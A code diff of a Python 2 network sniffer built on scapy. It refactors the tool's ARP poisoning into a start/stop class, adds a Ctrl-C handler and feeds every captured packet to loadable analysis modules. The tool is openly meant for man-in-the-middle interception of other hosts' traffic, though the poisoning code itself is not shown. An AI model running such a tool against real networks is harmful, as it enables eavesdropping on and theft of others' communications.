@@ -18,71 +18,71 @@ from scapy.all import *
 import sys
 import os
 import glob
-import time
-from threading import Thread
 from arp import ArpPoisoning
+import signal
 
-loadedModules = []
+loaded_modules = []
+arp_poisoning = None
 
 def analyze(packet):
     try:
-        for loadedModule in loadedModules:
-            loadedModule.processPacket(packet)
+        for loaded_module in loaded_modules:
+            loaded_module.processPacket(packet)
     except:
         pass
 
 def startNetwork(interface, arp):
-    try:
-        # ARP poisoning preparation
-        t = None
-        if arp != None:
-            try:
-                # Configure routing and iptables for arp poisoning
-                ArpPoisoning.configure(args.interface)
-                
-                # Prepare packet
-                ips = arp.split('-')
-                packet = ArpPoisoning.getPacket(ips[1], ips[0])
-                
-                print "[*] Start arp poisoning"
-                t = Thread(target=ArpPoisoning.inject, args =(packet))
-                t.start()
-            except:
-                t = None
-                print "[!] ARP poisoning failed"
+    # ARP poisoning preparation
+    if arp != None:
+        global arp_poisoning
+#       try:
+        arp_poisoning = ArpPoisoning()
+        # Configure routing and iptables for arp poisoning
+        arp_poisoning.configure(interface)
+            
+        # Prepare packet
+        ips = arp.split('-')
+        arp_poisoning.setPacket(ips[1], ips[0])
+            
+        print "[*] Start arp poisoning"
+        arp_poisoning.start()
+#       except:
+#           arp_poisoning = None
+#           print "[!] ARP poisoning failed"
 
-        # Sniffing packets
-        print "[*] Start sniffind on %s" % interface
-        sniff(prn=analyze, store=0, iface=interface, filter="tcp")
-    except KeyboardInterrupt:
-        print "[*] Stop Sniffing"
-        # kill ARP poisoning thread if needed
-        if t != None:
-            print "[*] Stop poisoning"
-            t.exit()
-        sys.exit(0)
+    # Sniffing packets
+    print "[*] Start sniffind on %s" % interface
+    sniff(prn=analyze, store=0, iface=interface)
 
-def loadModules(path, modulesToLoad):
+def loadModules(path, modules_to_load):
     print "[*] Loading modules"
     files = glob.glob(path + "*")
     for file in files:
-        fileName, fileExtension = os.path.splitext(file)
-        if not fileName.endswith("__init__") and fileExtension == ".py" and (modulesToLoad == None or (fileName.replace(path, "").split(".")[-1] in modulesToLoad.replace(" ", "").split(","))):
-            moduleName = fileName.replace("/", ".")
-            mod = __import__(moduleName)
-            modules = moduleName.split(".")
+        file_name, file_extension = os.path.splitext(file)
+        if not file_name.endswith("__init__") and file_extension == ".py" and (modules_to_load == None or (file_name.replace(path, "").split(".")[-1] in modules_to_load.replace(" ", "").split(","))):
+            module_name = file_name.replace("/", ".")
+            mod = __import__(module_name)
+            modules = module_name.split(".")
             for module in modules[1:]:
                 mod = getattr(mod, module)
-            loadedModules.append(mod.module())
-            if modulesToLoad != None:
-                print "    |-Using %s" % loadedModules[-1].moduleName
-    if modulesToLoad == None:
+            loaded_modules.append(mod.module())
+            if modules_to_load != None:
+                print "    |-Using %s" % loaded_modules[-1].module_name
+    if modules_to_load == None:
         print "    |-Using all modules"
 
 def listModules():
     print "[*] List of all modules"
-    for module in loadedModules:
+    for module in loaded_modules:
         print "    |-%s" % module.getDescription()
+
+def SigIntHand(SIG, FRM):
+    global arp_poisoning
+    if arp_poisoning != None:
+        print "[*] Stop arp poisoning"
+        arp_poisoning.stop()
+    print "[*] Stop sniffing"
+    sys.exit(0)
 
 if __name__ == '__main__':
     
@@ -104,6 +104,8 @@ if __name__ == '__main__':
         sys.exit(0)
 
     if args.interface != None:
+        # Signal handler
+        signal.signal(signal.SIGINT, SigIntHand)
         # Start sniffing and arp poisoning
         startNetwork(args.interface, args.arp)
     else:
